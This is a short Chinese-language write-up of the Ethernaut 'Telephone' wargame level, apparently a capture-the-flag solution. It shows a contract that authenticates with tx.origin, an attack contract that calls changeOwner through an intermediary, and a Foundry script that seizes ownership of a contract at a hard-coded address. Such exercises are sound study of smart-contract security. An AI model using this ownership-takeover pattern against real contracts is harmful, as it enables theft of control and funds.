合约代码：`Telephone.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

目标是获得合约所有权

思路：找到设置`owner`的地方，调用`ChangeOwner`函数就可以，但是需要通过 if 判断，解决办法就是用另一个合约调用函数。

攻击合约：`TelephoneAttack.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttack {
    function attack(address target, address _newowner) public {
        Telephone(target).changeOwner(_newowner);
    }
}
```

脚本：`Telephone.s.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/TelephoneAttack.sol";

contract MyScript is Script {

    function run() public {
        address _telephone = 0x464804F750704a0915E4ad32DC9609835277D544;
        address attacker = msg.sender;

        vm.startBroadcast();

        TelephoneAttack _attack = new TelephoneAttack();
        _attack.attack(_telephone, attacker);

        vm.stopBroadcast();
    }
}

```

